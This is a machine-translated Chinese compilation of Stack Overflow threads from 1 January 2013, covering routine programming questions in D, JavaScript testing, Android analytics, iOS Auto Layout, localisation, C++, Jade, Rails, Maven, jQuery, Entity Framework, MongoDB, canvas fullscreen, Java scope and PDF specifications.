> 时间：2013-01-01T15:43:36.307
> 
> 标签：d, phobos

如何简单地打开一个 url 并使用 D 从网页中读取数据？（如果需要使用标准的 lib 功能，我更喜欢 phobos 而不是 tango）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T15:50:11.487

curl 在标准库中。您可以像这样轻松获取 url：

```
import std.net.curl;
string content = get("d-lang.appspot.com/testUrl2"); 
```

[http://dlang.org/phobos/std_net_curl.html#get](http://dlang.org/phobos/std_net_curl.html#get)

如果需要解析html，我写了一个dom库，很擅长。 [https://github.com/adamdruppe/misc-stuff-including-D-programming-language-web-stuff](https://github.com/adamdruppe/misc-stuff-including-D-programming-language-web-stuff)

抓住 dom.d 和 characterencodings.d 然后你可以：

```
import arsd.dom;
auto document = new Document();
document.parseGarbage(content); // content is from above, the html string

writeln(document.title); // the <title> contents
auto paragraph = document.querySelector("p");
if(paragraph is null)
     writeln("no paragraphs in this document");
else
     writeln("the first paragraph is: ", paragraph.innerText); 
```

等等。如果您使用过 javascript dom api，这非常相似（尽管也以很多方式进行了扩展）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T15:47:50.960

我认为 std.net.curl 绑定是你最好的选择，特别是它的 get/post 方法（示例在文档中）：[http ://dlang.org/phobos/std_net_curl.html#get](http://dlang.org/phobos/std_net_curl.html#get)

毕竟，curl 是专门为这类任务设计的，绑定是 phobos 的一部分。

# javascript - 未捕获的 ReferenceError：未定义要求

> ID：14111785
> 
> 赞同：10
> 
> 时间：2013-01-01T15:44:48.663
> 
> 标签：javascript, angularjs, karma-runner, google-closure-library, commonjs

对于我正在进行的一个项目，我一直在使用 JavaScript 库的大杂烩。我的代码的主要逻辑被分解为多个 commonjs 模块。我使用 google 闭包将模块组合成一个输出 js 文件，我在 AngularJS 应用程序中使用该文件。

我遇到的问题是尝试用 testacular 进行测试。我收到的错误是`Uncaught ReferenceError: require is not defined`. 发生这种情况是因为，与谷歌关闭不同，testacular 不理解 commonjs 模块。我可以做一些变通方法，但我希望在不必重组代码的情况下使其工作。

1.  我可以重新构建模块，以便不再使用 commonjs。我不喜欢这样，因为这感觉像是倒退了一步。我希望我的代码是模块化的。
2.  我可以在从谷歌闭包编译的 js 上运行 testacular。我不介意这样做，但我无法触发一切来处理文件更改。Testacular 可以在文件更改时重新运行自己，但我还没有看到让谷歌关闭重新编译更改。
3.  最后，我可以在 testacular 中启用 commonjs 模块。理想情况下，这是我想走的路，但它可能不是最简单的。

有没有其他人遇到过类似的问题？我愿意尝试不同的事情；我只是不想要任何骇人听闻的东西。

**javaclassstreamreader.spec.js：**

```
"use strict"

var JavaClassStreamReader = require('../javaclassstreamreader.js').JavaClassStreamReader;

describe('javaclassstreamreader', function() {

  it('reader can be constructed', function() {
    var dataView = {
      byteLength : 0
    };
    //FIXME load dataView

    var reader = new JavaClassStreamReader(dataView);
    expect(reader.dataView).toBe(dataView);
    expect(reader.offset).toBe(0);
    expect(reader.maxOffset).toBe(0);
  });

}); 
```

**javaclassstreamreader.js：**

```
function JavaClassStreamReader(dataView, initialOffset, maxBytesToRead) {
  this.dataView = dataView;
  this.offset = initialOffset || 0;
  this.maxOffset = this.offset + (maxBytesToRead || this.dataView.byteLength);
}
//... code trucated ... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T19:52:30.267

Testacular似乎存在/存在[问题。](https://github.com/vojtajina/testacular/issues/250)

您可以尝试以下方法：

*   清除 npm 缓存：`npm cache clean`
*   安装另一个版本的睾丸：`npm install -g testacular@0.5.6`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T03:27:27.920

我无法使它与 . 一起使用`require`，但我确实有一个部分解决方案。

grunt.js：

```
/*global module:false*/
module.exports = function(grunt) {"use strict";

  // Project configuration.
  grunt.initConfig({
    pkg : '<json:package.json>',
    meta : {
      banner : '/*! <%= pkg.title || pkg.name %> - v<%= pkg.version %> - ' + '<%= grunt.template.today("yyyy-mm-dd") %>\n' + '<%= pkg.homepage ? "* " + pkg.homepage + "\n" : "" %>' + '* Copyright (c) <%= grunt.template.today("yyyy") %> <%= pkg.author.name %>;' + ' Licensed <%= _.pluck(pkg.licenses, "type").join(", ") %> */'
    },
    lint : {
      files : ['grunt.js', 'src/*.js', 'src/public/js/**/*.js', 'src/specs/**/*.js']
    },
    watch : {
      files : '<config:lint.files>',
      tasks : 'default'
    },
    exec : {
      ensure_generated_directory : {
        command : 'mkdir -p generated/js/'
      }
    },
    clean : {
      all : ['generated']
    },
    jshint : {
      files : '<config:lint.files>',
      options : {
        curly : true,
        eqeqeq : true,
        forin : true,
        immed : true,
        latedef : true,
        newcap : true,
        noarg : true,
        sub : true,
        undef : true,
        unused : true,
        strict : true,
        boss : true,
        eqnull : true,
        es5 : true,
        browser : true,
        jquery : true,
        devel : true
      },
      globals : {
        //jasmine
        describe : false,
        it : false,
        expect : false,
        //commonjs
        require : false,
        exports : true,
        //angular
        angular : false
      }
    },
    'closure-compiler' : {
      frontend : {
        closurePath : 'closure-compiler',
        js : ['src/*.js', 'src/public/js/**/*.js'],
        jsOutputFile : 'generated/js/complete-app.js',
        options : {
          externs : 'externs.js',
          compilation_level : 'SIMPLE_OPTIMIZATIONS',
          language_in : 'ECMASCRIPT5_STRICT',
          logging_level : 'ALL',
          debug : null,
          warning_level : 'verbose',
          summary_detail_level : 3,
          formatting : ['PRETTY_PRINT', 'PRINT_INPUT_DELIMITER'],
          common_js_entry_module : 'src/public/js/app.js',
          process_common_js_modules : null,
          process_jquery_primitives : null,
          common_js_module_path_prefix : 'src'
        }
      }
    },
    testacularServer : {
      integration : {
        options : {
          keepalive : true
        },
        configFile : 'testacular.conf.js',
        autoWatch : false,
        singleRun : true
      }
    }
  }); 

  // Default task.
  grunt.registerTask('default', 'lint exec:ensure_generated_directory closure-compiler testacularServer:integration');
  grunt.loadNpmTasks('grunt-contrib-watch');
  grunt.loadNpmTasks('grunt-closure-compiler');
  grunt.loadNpmTasks('grunt-exec');
  grunt.loadNpmTasks('grunt-contrib-clean');
  grunt.loadNpmTasks('grunt-testacular');
}; 
```

我可以运行`grunt watch`并且得到类似的结果。grunt lints，然后编译，然后运行 ​​testacular。这并没有我希望的那么快。testacular 每次启动和停止服务器。

# android - Android 谷歌分析 V2 myTracker

> ID：14111787
> 
> 赞同：2
> 
> 时间：2013-01-01T15:45:06.093
> 
> 标签：android, google-analytics

我想使用手动屏幕跟踪来跟踪我的 Android 应用程序中的视图。我在这里阅读[https://developers.google.com/analytics/devguides/collection/android/v2/screens](https://developers.google.com/analytics/devguides/collection/android/v2/screens)我需要使用此代码：

```
myTracker.trackView("Home Screen"); 
```

但是当我使用它时，Eclipse 显示一个错误（myTracker 无法解析）。

我对 EasyTracker 没有任何问题。

```
import com.google.analytics.tracking.android.EasyTracker;

EasyTracker.getInstance().activityStart(this); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T16:12:16.090

尝试：

```
Tracker myTracker = EasyTracker.getTracker();
myTracker.trackView("Home Screen"); 
```

# ios - 如何在 CAAnimationGroup 中为 NSLayoutConstraint 设置动画

> ID：14111790
> 
> 赞同：4
> 
> 时间：2013-01-01T15:45:29.213
> 
> 标签：ios, ios6, core-animation, autolayout, nslayoutconstraint

例如，我在自动布局前时间将其添加到 CAAnimationGroup 中。

```
CABasicAnimation *resizeAnimation = [CABasicAnimation animationWithKeyPath:@"bounds.size"];
[resizeAnimation setToValue:[NSValue valueWithCGSize:CGSizeMake(10.0f, 10.0f)]];
resizeAnimation.fillMode = kCAFillModeForwards;
resizeAnimation.removedOnCompletion = NO; 
```

在自动布局下，我假设现在我需要更改对象上约束的常量属性。

那么请您帮助我了解如何准备约束的动画。

**在 Best Practices Mastering Auto Layout 中编辑**- 在大约 30m 处，他使用 NSAnimationContext 在 OSX 上执行此操作 - 他没有谈论 iOS。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-18T18:47:18.643

我能想到的最佳答案是你不能这样做。您要么需要为图层设置动画，要么使用 UiView 动画方法。

# localization - 本地化语法和日期表示

> ID：14111793
> 
> 赞同：0
> 
> 时间：2013-01-01T15:45:58.080
> 
> 标签：localization, internationalization, human-readable

在我的 UI 编程生涯中，我曾多次想根据给定的语言环境正确地表示数字、时间、日期和列表等内容。

有没有可以提供帮助的图书馆？

Cocoa 和我猜想一些 Windows 框架将有助于数字、时间和日期的适合语言环境的人类可读表示。是否有任何简单的 C 或其他库可以帮助做到这一点？

我想表达一个名称列表，例如`James, Chris, Mark and Bob`. 当然，`and`结尾和逗号的使用是英语特有的，而[牛津逗号](http://en.wikipedia.org/wiki/Serial_comma)`U+002C`的缺乏可能是英式英语特有的。有没有图书馆可以解决这个问题？如果做不到这一点，是否有任何资源可以记录各种语言的这种语法结构？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T21:06:57.710

格式化列表是您所追求的吗？

因为[ICU](http://site.icu-project.org/)有类似的东西，它被称为[ListFormatter](http://icu-project.org/apiref/icu4c/classicu_1_1ListFormatter.html)。它可以为给定语言适当地格式化给定名称列表。列表分隔符（如逗号或分号）和 lest 终止符（“and”）都将被翻译。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T18:08:01.317

感谢 Paweł Dyda 对 ICU 的指点，我发现了 ICU 使用的东西[——CLDR](http://cldr.unicode.org)。

> Unicode CLDR 为支持世界语言的软件提供了关键的构建块，具有可用的最大和最广泛的语言环境数据标准存储库。这些数据被广泛的公司用于他们的软件国际化和本地化，使软件适应不同语言的惯例以完成这些常见的软件任务。

# c++ - 使用 boost::signal 自动更新依赖类成员

> ID：14111795
> 
> 赞同：0
> 
> 时间：2013-01-01T15:46:08.073
> 
> 标签：c++, boost

给定一个类，有几个成员变量必须在修改引用变量时更新。我想`boost::signal`用来帮助更新所有因变量。

这是代码。

```
#include <functional>
#include "boost/signal.hpp"
#include "boost/ref.hpp"
#include "boost/bind.hpp"

template<class T>
class AutoElement
{
public:
    AutoElement(T t) : m_element(t) {}
    typedef boost::function<void () > Handler;

    void Register(Handler h)
    {  m_signal.connect(h); }

    void operator() ()
    {  m_signal(); }

    void SetElement(T t)
    {  m_element = t; }

    T GetElement() const
    {  return m_element; }

private:
    T m_element;
    boost::signal<void ()> m_signal;
};

class AutoUpdateClass
{
public:
    AutoUpdateClass() : m_iBase(0)
    {        
        m_iBase.Register(boost::bind(&AutoUpdateClass::UpdateNumber, 
                         boost::ref(*this)));
        m_iBase(); // trigger handler(s)
    }

    void UpdateBase(int b)
    {
        m_iBase.SetElement(b);
        m_iBase(); // trigger handler(s)
    }

private:    
    void UpdateNumber() // m_iNumber is depended on m_iBase
    {   m_iNumber = m_iBase.GetElement() * 2; }

private:
    AutoElement<int> m_iBase; // the reference variable
    int m_iNumber;            // the variable depends on m_iBase
};

int main()
{
    AutoUpdateClass auc;
    // first m_iBase will be set and then m_iNumber will be updated.  
    auc.UpdateBase(40); 
} 
```

Question> 这个设计有没有潜在的问题？有没有更好的方法来完成这种任务？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:57:25.267

禁用`AutoUpdateClass::AutoUpdateClass(AutoUpdateClass const&)`和`AutoUpdateClass& AutoUpdateClass::operator=(AutoUpdateClass const&)`。

或正确实施它们。

如所写，一个副本`AutoUpdateClass`带有引用它被复制的那个，而不是它本身。

# api - 玉模板中有substr方法吗？

> ID：14111800
> 
> 赞同：4
> 
> 时间：2013-01-01T15:47:14.923
> 
> 标签：api, node.js, pug

玉模板中是否存在一些字符串方法？

像`subStr`，，？`slice`_`toLowerCase`

[我可以在它的文档](https://github.com/visionmedia/jade)中找到这个 API

我在哪里可以找到它们？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-01T15:59:41.433

您可以按原样使用模板中的变量。所以它只是 JavaScript 变量。

```
html
    head
        title= title.toUpperCase()
    body
        p= text.substr(1, 100) + '...' 
```

# ruby-on-rails - 如何覆盖 rails_admin 编辑字段

> ID：14111804
> 
> 赞同：0
> 
> 时间：2013-01-01T15:48:03.427
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rails-admin

我想在 rails_admin 编辑页面中包含相关列的下拉列表。

例如，我想从联系人编辑的下拉列表中选择用户。

在我的 config/initializers/rails_admin.rb

```
config.model 'Contact' do
  edit do
    field :user do
      partial 'edit_user'
    end
  end
end 
```

我也有部分 app/views/rails_admin/main/_edit_user.html.haml

但我没有得到预期的看法。这个怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-02T12:28:59.803

我认为（如果我错了，请纠正我）您希望该字段显示为数据库中用户的下拉列表。您是否阅读过此页面：[https](https://github.com/sferik/rails_admin/wiki/Enumeration) ://github.com/sferik/rails_admin/wiki/Enumeration ？

您可以为模型中的字段创建一个枚举方法，并在初始化程序中像这样调用它：

```
field :user, :enum do
   enum_mehod do :user_enum end
end 
```

# maven - 如何在 Maven 中使用 Processing 核心库？

> ID：14111805
> 
> 赞同：12
> 
> 时间：2013-01-01T15:48:09.137
> 
> 标签：maven, dependencies, processing, maven-central

我想在我的 Maven 项目中使用处理库，但我找不到任何依赖项。我在哪里可以得到它？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-05-02T06:22:54.777

## *编辑*

从 Processing 3 开始，[官方工件](https://mvnrepository.com/artifact/org.processing/core)被发布到 maven Central。

像这样使用（截至 2019 年 2 月的最新版本）：

```
<dependency>
    <groupId>org.processing</groupId>
    <artifactId>core</artifactId>
    <version>3.3.7</version>
</dependency> 
```

* * *

## 对于旧版本

您可以使用来自[clojars.org/quil/processing-core](https://clojars.org/quil/processing-core.)的稳定处理库。

要在 Maven 项目中使用 Clojars 存储库，请将以下内容添加到您的项目中`pom.xml`：

### 存储库

```
<repositories>
    <!-- ... -->
    <repository>
        <id>clojars.org</id>
        <url>http://clojars.org/repo</url>
    </repository>
    <!-- ... -->
</repositories> 
```

### 依赖

```
<dependencies>
    <!-- ... -->
    <dependency>
        <groupId>quil</groupId>
        <artifactId>processing-core</artifactId>
        <version>2.2.1</version>
    </dependency>
    <!-- ... -->
</dependencies> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-01T16:04:13.543

*自处理版本 3（2014 年 7 月 26 日首次发布）以来***，此答案已被弃用。****

 ** * *

不，我找不到具有最新处理 jar 的存储库（并且没有处理开发人员维护的存储库）。

您可以在本地 repo 中手动安装处理 jars（或者如果你有一个 nexus 代理）

看看[http://maven.apache.org/guides/mini/guide-3rd-party-jars-local.html](http://maven.apache.org/guides/mini/guide-3rd-party-jars-local.html)*

# jquery - 一个类的 JQuery 选择器，但只有下一个项目

> ID：14111812
> 
> 赞同：0
> 
> 时间：2013-01-01T15:50:24.767
> 
> 标签：jquery, dom, jquery-selectors

我不确定如何选择我的 div class="Repors_comments_form"。这里看起来如何

```
<div>
  <span onclick ="$('.Reports_comments_form').toggle();"  style="cursor:pointer">Report</span>
</div>
<div class="Reports_comments_form">
</div><!-- End of div Reports_form --> 
```

重要的是要注意这是一个循环，可能有很多评论，并且只想要下一个。我尝试了很多方法，但我能做的就是抓住所有类元素。

我试过

```
<span onclick ="$('.Reports_comments_form').toggle();"
<span onclick ="$('.Reports_comments_form').toggle().next();"
<span onclick ="$('.Reports_comments_form').next().toggle();"
<span onclick ="$('.Reports_comments_form').closest('div').next().toggle();" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:56:37.090

为了保持行为一致而不弄乱`parent()`链：

**标记：**

```
<div>
    <a href="#" data-target="someId" class="reportButton">Report</a>
</div>
<div id="someId" class="report">

      // you'll be generating the id in the loop, e.g. 'report-12', 'report-13' and so on

</div> 
```

**JS：**

```
$('.reportButton').click(function(e){

    e.preventDefault()

    $('#' + $(this).data('target') ).toggle()

}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:55:10.857

```
<div>
  <span onclick ="$(this).parent().next().toggle();"  style="cursor:pointer">Report</span>
</div>
<div class="Reports_comments_form">
    adadadads
</div>​ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T16:01:18.143

如果您向跨度添加一个类，您可以完全删除您的内联脚本并使用不显眼的 jQuery clcik 处理程序：

HTML

```
<div>
  <span class="reportButton" style="cursor:pointer">Report</span>
</div>
<div class="Reports_comments_form"> 
```

JS

```
 /* uses next() assuming you may have this button and report sequence in page multiple times*/
$(function(){
    $('.reportButton').click(function(){
              $(this).parent().next().toggle();
    })
}) 
```

如果在页面加载后动态添加按钮可以委托 clcik 处理程序使用`on()`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T15:59:44.657

```
<span onclick ="$(this).parent().next('.Reports_comments_form').toggle();" 
```

# asp.net-mvc - 在 MVC 控制器中使用 EF 进行多对多关系

> ID：14111813
> 
> 赞同：0
> 
> 时间：2013-01-01T15:51:18.170
> 
> 标签：asp.net-mvc, entity-framework

我有一个应用程序，其中有食谱和标签。由于Recipes可以有多个Tags，并且Tags可以属于多个recipe，所以我有以下模型：

```
public class Tag : IModel
{
    [Key]
    public int ID { get; set; }
    [Required(ErrorMessage = "Name is required.")]
    public string Name { get; set; }
    public virtual ICollection<Recipe> Recipes { get;set; }
}

public class Recipe : IModel
{
    [Key]
    public int ID { get; set; }
    [ForeignKey("Category")]
    public int CategoryId { get; set; }
    [Required(ErrorMessage = "The Title is required.")]
    public string Title { get; set; }
    public virtual ICollection<Tag> Tags { get; set; }
    public virtual Category Category { get; set; }
} 
```

我的 Recipe 控制器有一个 HttpGet Edit 操作，它返回视图的配方：

```
public ActionResult Edit(int id = 0)
    {

        Recipe recipe = _recipeService.GetByID(id, "Category,Tags");
        if (recipe == null)
        {
            return HttpNotFound();
        }
        CreateEditRecipeViewModel viewModel = new CreateEditRecipeViewModel(recipe, PopulateCategoryLookup(recipe));
        return View(viewModel);
    } 
```

此时，Recipe 的 Tag 集合由我的 GetById() 方法填充。但是，我不清楚我应该如何向视图模型添加一个集合，以便它可以在视图中出现。这是我当前的视图模型：

```
public class CreateEditRecipeViewModel
{        
    [HiddenInput]
    public int RecipeID { get; set; }
    public int CategoryId { get; set; }
    [Required(ErrorMessage = "The Title is required.")]
    public string Title { get; set; }
} 
```

在我看来，我希望有一个文本框，其中有一个逗号分隔的标签列表（例如早餐、素食、无麸质）。当打开编辑视图时，我希望它填充当前分配给配方的每个标签的名称。发布表单后，我想拆分标签列表，并在 HttpPost 编辑操作中，将值与 EF 协调一致。

如果有人对在 ViewModel 和 View 中表示复杂对象的集合有指导，我将不胜感激！

谢谢，

克里斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T20:09:32.980

我通常使用[ListBoxFor](http://msdn.microsoft.com/en-us/library/system.web.mvc.html.selectextensions.listboxfor%28v=vs.108%29.aspx)标记结合[Chosen](http://harvesthq.github.com/chosen/) jquery 插件来进行多选。惊人的简单。我将尝试一下这应该如何看待代码。但是我手头没有VS可以测试。就像是：

```
public class CreateEditRecipeViewModel
{        
    [HiddenInput]
    public int RecipeID { get; set; }
    public int CategoryId { get; set; }
    public List<int> TagIds { get; set; }
    [Required(ErrorMessage = "The Title is required.")]
    public string Title { get; set; }
}

//Then in view...

@Html.ListBoxFor(model => model.TagIds, HelperMethodToGetSelectListOfTags()) 
```

然后就像您提到的那样，当您将视图模型转回常规模型时，您只需将选定的 id 与 EF 协调即可。

这种方法的唯一缺点是您需要一些单独的代码来创建新标签。但你没有提到这是一项要求。

希望有帮助！

# mongodb - 查询 MongoDB 嵌入式数组

> ID：14111816
> 
> 赞同：0
> 
> 时间：2013-01-01T15:51:36.257
> 
> 标签：mongodb

我在尝试查询 Mongo 中的字段时遇到了一些麻烦。我的文档如下所示：

```
{
    "short_url": "DTsB9k",
    "long_url": "http://www.example.com",
    "date_created": {
        "$date": "2013-01-01T14:10:29.899Z"
    },
    "ips": {
        "24.184.209.227": {
            "ip_address": "12.34.56.78",
            "clicks": [
                {
                    "click_date": {
                        "$date": "2013-01-01T14:10:41.784Z"
                    },
                    "click_referrer": null
                },
                {
                    "click_date": {
                        "$date": "2013-01-01T14:31:32.440Z"
                    },
                    "click_referrer": null
                }
            ]
        }
    },
    "users": {
        "4": {
            "user_id": "4",
            "date_added": {
                "$date": "2013-01-01T14:10:29.899Z"
            },
            "creator": true
        }
    },
    "total_clicks": 2,
    "_id": {
        "$oid": "50e2ee55569df0b469000000"
    }
} 
```

我正在尝试查询user_id，最终会有不止一个。但我试过了

```
{ "users" : "4" }
{ "users.user_id" : "4" }
{ "users.*.user_id" : "4" } 
```

这些都不起作用。我在这做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:59:16.747

1.  {"users":4} 只会找到 users 字段等于 4 的文档，或者 users 字段等于包含等于 4 的元素的数组的文档

2.  {"users.user_id":4} 如果您在 users 对象下直接有 user_id 会起作用，但它在“4”下，因此无法匹配

3.  { "users.*.user_id" : "4" } 我不认为 mongodb 有这样的通配符功能。

要获取上面的记录，您可以尝试：

`{"users.4.user_id": "4"}`

* * *

编辑：如果“users”下的“4”与user_id相同，也可以试试查询：

`{"users.4":{$exists:true}}`

# javascript - 画布上的 Webkit JavaScript 全屏不起作用

> ID：14111823
> 
> 赞同：0
> 
> 时间：2013-01-01T15:53:02.330
> 
> 标签：javascript, html, canvas, fullscreen

我正在尝试通过 javascript 全屏显示画布。

虽然在 Firefox 中它工作正常，但在 chrome 中却不行。

这就是我所做的：

```
document.addEventListener('webkitfullscreenchange', function(e) {
    var canv = gamvas.getCanvas();
    if (canv) {
        if (document.webkitIsFullScreen) {
            gamvas._isFullScreen = true;
            canv.style.width=screen.width+'px';
            canv.style.height=screen.height+'px';
        } else {
            gamvas._isFullScreen = false;
            canv.style.width=canv.width+'px';
            canv.style.height=canv.height+'px';
        }
    }
}, false); 
```

然后，当我使用 canvas.webkitRequestFullscreen() 调用上面的代码时，它具有桌面的正确 screen.width/height，但似乎结果被缩放。因此，要么浏览器设置的屏幕模式少于桌面，要么放大画布。结果是画布与屏幕不匹配，部分流过屏幕的右下边界。

我尝试使用 -webkit-full-screen css 到 100%，但是虽然它适用于垂直尺寸，但它仍然在水平尺寸上关闭

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T08:36:19.077

尝试这个

```
#canvas:-webkit-full-screen {
width: 100%;
height: 100%;
}
#canvas:-moz-full-screen {
width: 100%;
height: 100%;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T17:07:40.493

这是已向 Chromium 团队报告的错误。您可以在[http://code.google.com/p/chromium/issues/detail?id=138368关注问题](http://code.google.com/p/chromium/issues/detail?id=138368)

# java - Java 难以通过循环与类对象通信

> ID：14111824
> 
> 赞同：1
> 
> 时间：2013-01-01T15:53:04.180
> 
> 标签：java

我有一个名为工人的班级和一个名为 Pass 的班级，这是工人的通行证。我正在尝试构建从文本文件中读取所有进程的主类。我的代码充满了循环，希望能正常工作，但我遇到了问题。文本的第一行是纯文本，例如 Worker: 1 worker1 ，这只是意味着创建一个名为 worker1 的 Worker 对象，passid（他的通行证的 id）编号为 1。这是可行的。但是在此之后我只是将他的通行证的创建放入循环中。这是我的问题。文本文件的第 2n 行为 worker1 提供了一个 AccessLog，为我提供了进入和退出的日期。

```
 public static void main(String[ ] args) throws IOException {

  String file_name = "data.txt";

  try {
      FileRead file = new FileRead( file_name );
      String[ ] aryLines = file.Openfile();

      int i;
      for ( i=0; i < aryLines.length; i++ ) {
             String phrase = aryLines[i];
             String div = "[ ]+";
             String[] tokens = phrase.split(div);

             if (tokens[0].equals("Officer:")){

               if (tokens[1].equals("1")){

               Officer worker1 = new Worker("1","worker1",1);
               Pass worker1Pass = worker1.getPass();
               }

             //etc. for other workers                   
             } 
```

这是访问日志的代码，将解释错误

```
 else{
                 if (tokens[0].equals("AccessLog:")){

                  if (tokens[1].equals("1")){
                  String s1 = tokens[2] + tokens[3] ;
                  String s2 = tokens[4] + tokens[5] ;

                  try{
                      Date entry = new SimpleDateFormat("dd/MM/yyHH:mm:ss").parse(s1);

                      Date exit = new SimpleDateFormat("dd/MM/yyHH:mm:ss").parse(s2);
                      worker1Pass.workerEntry(entry);
                      worker1Pass.workerExit(exit);

                  }
                    catch (ParseException a) {
                       System.out.println( a.getMessage() );
                    }  
               } 
```

workerentry 和 exit 是 pass 类中记录访问的方法，我得到一个缺少符号 worker1pass 的错误。workerpass 声明中似乎也存在问题，因为在 netbeans 中，worker1pass 下方有一条灰线，将其称为未使用object.Lastly 我想补充一点，除了外部文本文件的解决方法代码之外，代码 100% 有效。欢迎任何提示和建议。

编辑 - - - -

```
 Worker worker1 = new Worker("1","worker1",1);
               Pass worker1Pass = worker1.getPass(); 
```

在worker1Pass下我得到：变量worker1Pass未使用

```
 worker1Pass.workerEntry(entry);
                  worker1Pass.workerExit(exit); 
```

这里我找不到符号：worker1pass 就像 pass worker1pass 声明没有像它应该做的那样声明一个新的 pass，因此这些方法不会像应该做的那样将入口和出口添加到日志中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:01:57.333

您收到`missing symbol`错误是因为`worker1Pass`在第一`if`条语句中定义并且仅在 if 上下文中可见。这就是 netbeans 也抱怨的原因，因为第`worker1Pass`一个`if`在其他任何地方都不可见（也不使用）。你应该`worker1Pass`在你的外部声明`if`，至少，在第二个`if`语句中也是可见的。

就像@HovercraftFullOfEels 建议的那样，如果您需要维护可以使用[Collection](http://docs.oracle.com/javase/6/docs/api/java/util/Collection.html)或[List](http://docs.oracle.com/javase/6/docs/api/java/util/List.html)`workers`的所有对象，您的代码将类似于：`pass`

```
List<Officer> workers = new ArrayList<Officer>();
List<Pass> passes = new ArrayList<Pass>();
for ( i=0; i < aryLines.length; i++ ) { 
  String phrase = aryLines[i];
  String div = "[ ]+";
  String[] tokens = phrase.split(div);
  Officer worker = null; // and from this point on use this variable to represent a worker
  Pass workerPass = null; // used to represent a pass
  if (tokens[0].equals("Officer:")){
     if (tokens[1].equals("1")){
        worker = new Worker("1","worker1",1);
        workerPass = worker1.getPass();
        workers.add(worker); // add the worker in the workers list
        passes.add(workerPass); // add the pass in the passes list

     } 
     //etc. for other workers                   
  } 
```

# c++ - 编码员的 PDF 规范：Adobe 还是 ISO？

> ID：14111831
> 
> 赞同：72
> 
> 时间：2013-01-01T15:54:36.057
> 
> 标签：c++, c, pdf, specifications

我想编写一个可以读取和解码 pdf 文档的应用程序；现在我应该从哪里获得这种文件格式的规格？PDF 格式是由 ISO 组标准化的，但我不清楚从哪里获取此类信息的最可靠来源。

什么是从这种文件格式开始的好来源？

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2013-01-01T23:12:37.003

您实际上可以使用您提到的两种来源；这种混乱是历史性的。

Adobe 发明了 PDF，并发明了与它一起使用的 Acrobat 产品系列。不同的 PDF 版本与主要的 Acrobat 版本一起发布（例如 PDF 1.3 与 Acrobat 4 一起发布）。

由于采用了 PDF 格式，并且由于编写了许多实际上依赖于专有 PDF 文件格式的 ISO 标准（对于 ISO 标准来说不是一件容易的事情），Adobe 决定将 PDF 格式移交给 ISO。

从那时起一直到今天，都有一个 ISO 委员会负责编辑 PDF 规范并提出新版本。PDF 的 ISO 标准是 ISO 32000。

此外，请记住，根据您要使用 PDF 的位置，许多其他 ISO 标准可能非常有用或必不可少。其中最常用的是 PDF/X（用于在出版界交换 PDF 文件）和 PDF/A（用于创建需要在长期存储中存档的 PDF 文件）。这些规范引用了 PDF 标准的特定版本，并添加了额外的要求和限制。

就规范而言，您可以直接从 ISO 获取所有文档。但是，对于 PDF 本身，您也可以从 Adob​​e 获得它，并且该文档将是相同的。请参阅 Acrobat 上的 Adob​​e DevNet 站点：

[http://www.adobe.com/devnet/acrobat.html](http://www.adobe.com/devnet/acrobat.html)

只需下载 Acrobat SDK，它就会为您提供文档作为其中的一部分。

让我在代码中添加一个关于“以 PDF 规范为目标”的警告。我真的，真的，真的建议您更清楚地指定您对 PDF 的需求（编辑、生成、质量控制（预检）），然后寻找或询问满足这些需求或可以扩展以满足这些需求的现有库您的需求。

编写一般支持“PDF”的东西将是一项艰巨的任务。PDF 规范很大、很复杂并且充满了……嗯……细节。有龙！

* * *

**更新：**

Adobe 的 PDF-1.7 规范文档的直接链接（第一版，免费下载，在这里：

*   [**文档管理 — 可移植文档格式 — 第 1 部分：PDF 1.7**](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf)

该文件的内容后来被正式采用为通用 PDF 的 ISO 标准 ISO 32000-1。

但请注意，ISO 提供的 PDF 文件存在一些差异：

*   与 Adob​​e 的版本相比，页面布局发生了变化。
*   ISO 文件不是免费提供的（下载这份文件的[费用为瑞士法郎 CHF 238.-](http://www.iso.org/iso/catalogue_detail.htm?csnumber=51502)）。

如果您开始开发 PDF 软件，从上面的 Adob​​e 链接中获得（免费）PDF 就足够了。

* * *

**更新：2021**

值得注意的是，ISO 同时发布了 PDF 规范的新版本，称为 ISO 32000-2。[ISO 网站](https://www.iso.org/standard/75839.html)上的相关信息。这个新版本于 2017 年发布，并于 2020 年 12 月获得更新。

尽管该文档没有显着改变 PDF，并且大多数关于 PDF 的一般信息（例如免费的 Adob​​e 规范版本）仍然是正确的，但肯定有一些变化：

*   许多事情，尤其是深度技术性的事情，比如关于透明度的一切，都得到了更新，主要是为了澄清现有的语言（并添加到目前为止或多或少隐含的信息）。这些更新*可能*会影响如何实施或使用标准的这些部分。
*   新功能已包含在标准中。

如果您正在编写 PDF 文件，尤其是更简单的文件，Adobe 规范应该仍然可以让您继续前进。如果您想支持 PDF 标准中的所有内容，则需要为最新的 ISO 版本付费（但无论如何这是一项艰巨的任务）。

* * *

## 回答 #2

